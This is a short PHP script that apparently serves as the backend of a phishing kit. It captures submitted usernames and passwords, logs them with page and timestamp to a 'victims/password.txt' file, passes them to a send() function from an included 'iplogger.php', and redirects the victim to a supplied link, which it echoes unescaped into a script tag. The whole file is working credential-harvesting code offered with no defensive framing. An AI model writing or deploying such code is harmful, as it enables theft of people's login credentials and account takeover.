<?php
include("iplogger.php");
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{		   
    $user_agent = $_SERVER['HTTP_USER_AGENT'];       
    $data = "username:" .$_POST['username']."\n".    
            "password:" .$_POST['password']."\n".    
	        "Page:"     .$_POST['location']."\n".                                                         
	        "Date:"     .(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n";                                                          
		
    File_Put_Contents(".././victims/password.txt", $data, FILE_APPEND);                                      
    send($data);	
}
if(isset($_POST['link'])) echo "<script>window.location.replace('".$_POST['link']."');</script>";
else echo "<script>window.location.replace('https://graysuit.github.io');</script>";
?>
